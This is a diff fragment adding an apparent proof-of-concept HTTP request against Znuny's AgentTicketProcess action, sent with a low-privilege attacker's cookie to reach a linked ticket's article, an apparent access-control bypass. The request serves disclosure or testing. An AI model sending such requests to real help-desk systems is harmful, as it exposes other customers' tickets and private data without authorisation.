@@ -1,0 +1,2 @@
+GET /znuny/index.pl?Action=AgentTicketProcess;Subaction=DisplayActivityDialog;ProcessEntityID=Process-e3ba9e15b77ad51b99bfe82d5ed8abfa;ActivityDialogEntityID=ActivityDialog-95da68e7feabff50cdefa69eb196d17d;LinkTicketID=78;ArticleID=93 HTTP/1.1
+Cookie: OTRSAgentInterface=<low-priv attacker>
